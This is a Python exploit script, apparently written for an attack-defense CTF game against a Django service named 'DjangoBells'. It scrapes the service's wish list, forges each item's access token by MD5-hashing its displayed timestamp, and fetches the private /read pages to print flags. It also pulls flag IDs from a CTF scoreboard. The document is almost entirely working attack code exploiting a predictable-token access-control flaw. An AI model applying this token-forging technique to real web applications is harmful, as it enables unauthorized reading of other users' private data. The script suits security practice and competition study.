#!/usr/bin/env python3

import json
import random
import requests
import string
import sys
from bs4 import BeautifulSoup
from hashlib import md5

# CHANGE THESE
service_name = 'DjangoBells'
service_port = 8000

# UTILITY FUNCTIONS
randstr = lambda N: ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
randmail = lambda: f"{randstr(8)}@{randstr(8)}.com"

ip = sys.argv[1]
url = f'http://{ip}:{service_port}'

def expl(flag_id=None):
    # Write your exploit here, and print stuff containing the flags
    # flush=True is MANDATORY
    soup = BeautifulSoup(requests.get(f"{url}/list").text)
    wishes = soup.find_all(class_ = 'wish-item')
    for wish in wishes:
        w = str(wish)
        id = w.split("</strong> ")[1].split("<br/>")[0]
        timestamp = w.split("Timestamp: </strong>")[1].split("<br/>")[0]
        token = md5(timestamp.encode("utf-8").strip()).hexdigest()
        print(requests.get(f"{url}/read/{id}/{token}").text)



def get_flag_ids():
    r = requests.get('https://scoreboard.ctf.saarland/attack.json')
    if r.status_code != 200:
        print(r.text)
        raise RuntimeError("Failed to fetch flag IDs")
    return json.loads(r.text)

expl()